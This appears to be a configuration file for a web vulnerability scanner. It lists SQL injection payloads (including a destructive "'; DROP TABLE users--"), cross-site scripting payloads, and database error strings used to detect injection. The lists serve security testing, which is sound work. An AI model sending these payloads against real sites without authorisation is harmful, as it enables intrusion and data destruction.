SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 1=1#",
    "' OR '1'='1' --",
    "admin'--",
    "' UNION SELECT NULL--",
    "1' ORDER BY 1--",
    "' AND SLEEP(3)--",
    "'; DROP TABLE users--",
    "' OR 'x'='x",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><script>alert('XSS')</script>",
    "<body onload=alert('XSS')>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>",
]

SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax",
    "ora-",
    "syntax error",
    "microsoft ole db provider",
    "postgresql error",
]